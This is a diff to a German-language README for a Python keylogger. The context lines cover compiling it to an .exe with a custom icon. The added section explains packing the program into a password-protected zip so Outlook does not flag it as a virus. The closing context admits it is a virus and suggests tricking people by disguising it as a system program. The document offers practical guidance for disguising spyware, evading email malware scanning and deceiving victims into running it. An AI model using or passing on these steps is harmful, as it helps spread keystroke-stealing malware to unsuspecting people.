@@ -24,6 +24,12 @@ Du kannst im Powershell eine .py Datei in eine .exe machen indem du folgenden Co
 keylogger.py → Python-Skript, das kompiliert wird  
 --icon=icon.ico → setzt ein benutzerdefiniertes Icon für die .exe-Datei
 
+## Zip-Datei verschlüsseln
+In diesem Script musst du ihn in eine verschlüsslte Zip-Datei stecken,  
+damit du diese per Outlook sendet kannst, da es ansonsten als Virus  
+erkannt wird. Dies macht man mit 7zip und danach so:  
+`Rechtsklick Ordner --> 7zip --> Zu einem Archiv hinzufügen… --> Archivformat: zip --> Passwort setzen --> OK`
+
 ## Wie starte/beendet sich das Script?
 Das Script startet nicht Automatisch das es ein Virus ist, jedoch  
 kann man die Leute tricken indem man es als irgndein System welches  
